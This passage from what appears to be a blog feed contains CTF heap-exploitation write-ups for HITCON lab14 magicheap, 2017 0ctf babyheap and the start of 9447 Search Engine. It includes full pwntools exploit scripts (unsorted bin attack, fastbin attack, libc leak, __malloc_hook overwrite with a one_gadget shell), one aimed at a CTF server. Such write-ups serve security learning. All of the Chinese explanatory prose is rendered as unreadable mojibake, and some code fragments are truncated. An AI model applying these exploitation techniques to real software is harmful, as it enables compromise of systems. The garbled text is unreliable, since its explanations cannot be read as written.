è¿‡çš„åœ°å€çš„fd(+0x10)å†™ä¸ºunsortedbinåœ°å€ï¼Œæ­¤æ—¶ç›®çš„è¾¾åˆ°äº†ï¼Œunsortedbiné“¾è¡¨ä¹Ÿåæ‰äº†ï¼Œä¸è¿‡å’Œæˆ‘ä»¬æ²¡å…³ç³»&gt;_&lt;</p><h2 id="HITCON-Training-lab14-magic-heap"><a href="#HITCON-Training-lab14-magic-heap" class="headerlink" title="HITCON Training lab14 magic heap"></a>HITCON Training lab14 magic heap</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unsorted_bin_attack/hitcontraining_lab14</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 /m/h/S/heap&gt; checksec magicheap </span><br><span class="line">[*] &#x27;/mnt/hgfs/Share/heap/magicheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæœ‰åé—¨å‡½æ•°ï¼Œeditå †æ—¶å­˜åœ¨å †æº¢å‡º</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">    l33t();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åˆšè¯´çš„æ¼æ´å±ç”¨æ²¡æœ‰ï¼Œå°±æ˜¯å¯ä»¥éšæ„æŠŠä¸€ä¸ªåœ°å€æ”¹ä¸€ä¸ªå¤§æ•°å­—</p><p>æ³¨æ„ä¸è¢«topchunkåˆå¹¶ï¼Œæº¢å‡ºæŠŠbkè¦†ç›–ä¸ºmagic-0x10ï¼Œå‰©ä¸‹äº¤ç»™ç®¡ç†å™¨å°±è¡Œäº†</p><p><img src="/2023/03/21/Unsorted-Bin-Attack/image-20230321154447592.png" alt="image-20230321154447592"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./magicheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_heap</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">create_heap(<span class="number">0x70</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">create_heap(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">del_heap(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">magic = <span class="number">0x6020c0</span></span><br><span class="line">payload=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(<span class="number">0</span>)+p64(magic-<span class="number">0x10</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">create_heap(<span class="number">0x90</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x12</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Attach </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017-0ctf-babyheap</title>
      <link href="/2023/03/20/2017-0ctf-babyheap/"/>
      <url>/2023/03/20/2017-0ctf-babyheap/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16:~/Desktop/pwn/heap$ checksec babyheap </span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/heap/babyheap&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>åˆšå¼€å§‹çš„init_myä¼šåˆ©ç”¨&#x2F;dev&#x2F;urandoméšæœºå‡½æ•°ç”¨mmapéšæœºæ˜ å°„ä¸€å—å†…å­˜ç»™æˆ‘ä»¬å­˜æ”¾æŒ‡é’ˆï¼Œæ²¡æœ‰äº†ç¡®å®šåœ°å€ï¼Œæˆ‘ä»¬å°±ä¸å¥½å»æ„æˆunlinkæ”»å‡»</p><p>allocate()æ ¹æ®æˆ‘ä»¬è¾“å…¥çš„sizeæ„æˆå¦‚ä¸‹ä¸€ä¸ªç»“æ„ä½“ï¼ŒæŠŠæŒ‡é’ˆæ”¾åœ¨mmapçš„å †ä¸Š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> chunk           struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> inuse           dq ?</span><br><span class="line"><span class="number">00000008</span> size            dq ?</span><br><span class="line"><span class="number">00000010</span> ptr             dq ?                    ; offset</span><br><span class="line"><span class="number">00000018</span> chunk           ends</span><br></pre></td></tr></table></figure><p>fill()ä¹Ÿä¼šæ ¹æ®æˆ‘ä»¬çš„sizeè¿›è¡Œè¯»å†™ï¼Œä»»æ„å †æº¢å‡ºï¼Œè¿™å°±å¥½åŠäº†</p><p>freechunk()æŒºå¥½çš„,è¯¥ç½®é›¶çš„éƒ½ç½®é›¶</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">a1[v2].size = <span class="number">0LL</span>;</span><br><span class="line"><span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">result = (__int64)&amp;a1[v2];</span><br><span class="line">*(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><h2 id="unsort-binæ³„éœ²libc"><a href="#unsort-binæ³„éœ²libc" class="headerlink" title="unsort binæ³„éœ²libc"></a>unsort binæ³„éœ²libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬ç”³è¯·äº”ä¸ªå †</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817100944060.png" alt="image-20230817100944060"></p><p>æˆ‘ä»¬free(2)free(1)åå½¢æˆå•é“¾è¡¨</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103408525.png" alt="image-20230320103408525"></p><p>ç”±äºæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å †æº¢å‡ºchunk0å»ä¸€æ”¹å†™chunk1ï¼Œæ”¹å†™1çš„fdä¸ºï¼Œç”±äºå †ä¸€èˆ¬éƒ½æ˜¯ä»¥4kå¯¹é½çš„ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ç”³è¯·å †çš„å¤§å°çŒœæµ‹å¤„chunk2å’Œchunk4åªæœ‰æœ€åä¸€ä¸ªå­—èŠ‚0x80çš„å·®è·</p><p><code>payload = 0x10 * b&#39;a&#39; + p64(0) + p64(0x21) + p8(0x80)</code>å³å¯</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103540783.png" alt="image-20230320103540783"></p><p>è¿™æ ·æˆ‘ä»¬ç”³è¯·ä¸¤æ¬¡å°±å¯ä»¥æ‹¿åˆ°chunk4ï¼Œæˆ‘ä»¬éœ€è¦æ”¹å†™å¤§å°ç»•è¿‡fastbin0x20çš„æ£€æµ‹</p><p>å †æº¢å‡ºchunk3å³å¯<code>payload = 0x10 * b&#39;b&#39; + p64(0) + p64(0x21)</code></p><p>allocate(0x10)<br>allocate(0x10)</p><p>æŠŠchunk2åˆ†é…åˆ°chunk4æ•°æ®åŒº</p><p>è¿™æ—¶å€™é‡Šæ”¾chunk4ä¹‹å‰ï¼Œè¦å†ç”³è¯·ä¸€ä¸ªå †é˜²æ­¢unsorted binçš„chunk4ä¸topchunkåˆå¹¶ï¼Œå¹¶æŠŠchunk4çš„å¤§å°æº¢å‡ºä¸º0x91è¿›å…¥unsortedbinï¼Œè¾“å‡ºchunk2å°±èƒ½æ‹¿åˆ°unsortbinåœ°å€</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101003145.png" alt="image-20230817101003145"></p><p>é€šè¿‡å›ºå®šåç§»æ‰¾åˆ°libcåŸºå€</p><h2 id="åˆ‡å‰²chunk-malloc-hook"><a href="#åˆ‡å‰²chunk-malloc-hook" class="headerlink" title="åˆ‡å‰²chunk malloc_hook"></a>åˆ‡å‰²chunk malloc_hook</h2><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬çš„chunk2æ˜¯å¯ä»¥æ§åˆ¶chunk4çš„dataåŒºï¼Œè¿™å°±éœ€è¦æˆ‘ä»¬æŠŠchunk4ä¸¢åˆ°fastbinçš„é“¾è¡¨ä¸­ï¼Œå®ç°ä»»æ„åœ°å€mallocï¼Œä½†æ˜¯chunk4ç°åœ¨å†unsortbinçš„å¾ªç¯é“¾è¡¨é‡Œ</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ptmalloc2ç‰¹æ€§<strong>å½“fastbinå¤§å°é‡Œæ²¡æœ‰åˆé€‚å¤§å°çš„chunkï¼Œä¼šå»unsorted binæ‰¾åˆé€‚å¤§å°çš„å—æˆ–è€…åˆ‡å‰²åˆé€‚å¤§å°çš„å—</strong></p><blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">void</span>* x = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//é˜²æ­¢å’Œtopchunkåˆå¹¶</span></span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">    <span class="type">void</span>* y = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -g -o test test.c</span></span><br></pre></td></tr></table></figure><p>malloc(0x10)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320111817704.png" alt="image-20230320111817704"></p><p>free(x)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101021289.png" alt="image-20230817101021289"></p><p>void* y &#x3D; malloc(0x60);</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230817101219838.png" alt="image-20230817101219838"></p><p>å¯ä»¥çœ‹åˆ°ç›´æ¥åˆ†å‰²</p></blockquote><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320103948398.png" alt="image-20230320103948398"></p><p>0x7fæˆ‘ä»¬éœ€è¦ä¼ªé€ 0x60å¤§å°chunkï¼Œç›´æ¥ä¸€æ­¥è¾¾åˆ°è¦æ±‚</p><p>allocate(0x60) #idx4<br>free(4)</p><p>å†æŠŠfakechunkå†™å…¥</p><p>ake_chunk_addr &#x3D; main_arena - 0x33<br>fake_chunk &#x3D; p64(fake_chunk_addr)<br>fill(2, len(fake_chunk), fake_chunk)</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320112319902.png" alt="image-20230320112319902"></p><p>allocate(0x60)  # idx 4<br>allocate(0x60)  # idx 6</p><p>å¾—åˆ°chunk</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>å†™å…¥onegadget</p><p>one_gadget_addr &#x3D; libc + 0x4526a<br>payload &#x3D; 0x13 * bâ€™aâ€™ + p64(one_gadget_addr)<br>fill(6, len(payload), payload)</p><p>ç»§ç»­è·‘è·¯</p><p><img src="/2023/03/20/2017-0ctf-babyheap/image-20230320110015505.png" alt="image-20230320110015505"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./babyheap&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="string">&#x27;28529&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allocate</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Command: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 0, 0x00</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 1, 0x20</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 2, 0x40</span></span><br><span class="line">allocate(<span class="number">0x10</span>)  <span class="comment"># idx 3, 0x60</span></span><br><span class="line">allocate(<span class="number">0x80</span>)  <span class="comment"># idx 4, 0x80</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;b&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 1</span></span><br><span class="line">allocate(<span class="number">0x10</span>) <span class="comment">#idx 2</span></span><br><span class="line">payload = <span class="number">0x10</span> * <span class="string">b&#x27;c&#x27;</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)<span class="comment"># idx5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Content: \n&#x27;</span>)</span><br><span class="line">unsortbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">main_arena=unsortbin_addr-<span class="number">88</span></span><br><span class="line">libc=main_arena-<span class="number">0x3C4B20</span></span><br><span class="line">p(<span class="string">&#x27;libc&#x27;</span>,libc)</span><br><span class="line">allocate(<span class="number">0x60</span>) <span class="comment">#idx4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">fake_chunk_addr = main_arena - <span class="number">0x33</span></span><br><span class="line">fake_chunk = p64(fake_chunk_addr)</span><br><span class="line">fill(<span class="number">2</span>, <span class="built_in">len</span>(fake_chunk), fake_chunk)</span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 4</span></span><br><span class="line">allocate(<span class="number">0x60</span>)  <span class="comment"># idx 6</span></span><br><span class="line">one_gadget_addr = libc + <span class="number">0x4526a</span></span><br><span class="line">payload = <span class="number">0x13</span> * <span class="string">b&#x27;a&#x27;</span> + p64(one_gadget_addr)</span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x100</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Unsorted Bin Leak </tag>
            
            <tag> Malloc Hook </tag>
            
            <tag> Split Chunk </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arbitrary Alloc 2015 9447 CTF:Search Engine</title>
      <link href="/2023/03/19/2015-9447-CTF-Search-Engine/"/>
      <url>/2023/03/19/2015-9447-CTF-Search-Engine/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2015_9447ctf_search-engine</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu16 ~/D/p/heap&gt; checksec search </span><br><span class="line">[*] <span class="string">&#x27;/home/grxer/Desktop/pwn/heap/search&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜é™æ€åˆ†æèµ·æ¥æŒºå¤æ‚çš„ï¼Œè‡ªå®šä¹‰çš„è¾“å…¥å‡½æ•°ï¼Œå„ç§é˜»åŠ›ï¼Œæœ€åé…åˆgdbåŠ¨æ€æ‰ææ˜ç™½</p><p>index_sentence()è¯»å–ç”¨æˆ·è¾“å…¥sizeé•¿åº¦çš„sentenceï¼Œä»–è¿˜ä¼šç”¨ä¸‹é¢çš„ç»“æ„æŠŠæ¯ä¸ªå¥å­çš„å•è¯åˆ†å¼€æ„æˆä¸€ä¸ªå•é“¾è¡¨ï¼Œå•é“¾è¡¨çš„contentæ˜¯ä»sentenceåœ°å€ä¸ŠåŸæ•°æ®åœ°å€ï¼Œè¡¨å¤´åœ¨0x6020B8ï¼Œå•é“¾è¡¨è¡¨å¤´æ˜¯æœ€åä¸€ä¸ªå•è¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> word_struct     struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_6)</span><br><span class="line"><span class="number">00000000</span> content         dq ?å•è¯</span><br><span class="line"><span class="number">00000008</span> size            dd ?å•è¯</span><br><span class="line"><span class="number">0000000</span>C padding1        dd ?</span><br><span class="line"><span class="number">00000010</span> sentence_ptr    dq ?å¥å­                 ; offset</span><br><span class="line"><span class="number">00000018</span> len             dd ?æ•´ä¸ªå¥å­</span><br><span class="line"><span class="number">0000001</span>C padding2        dd ?</span><br><span class="line"><span class="number">00000020</span> next            dq ?                    ; offset</span><br><span class="line"><span class="number">00000028</span> word_struct     ends</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”±äºç©ºé—´å¤ç”¨å…¶å®heap mangerç»™æˆ‘ä»¬0x30å¤§å°chunk</p><p>search_word()è¯»å–ä¸€ä¸ªè¾“å…¥é•¿åº¦æ¯”è¾ƒ<code>i-&gt;size == num &amp;&amp; !memcmp(i-&gt;content, v1, num)</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(i-&gt;sentence_ptr, <span class="number">0</span>, i-&gt;len);</span><br><span class="line"><span class="built_in">free</span>(i-&gt;sentence_ptr);</span><br><span class="line"><span class="built_in">puts</span>(<span 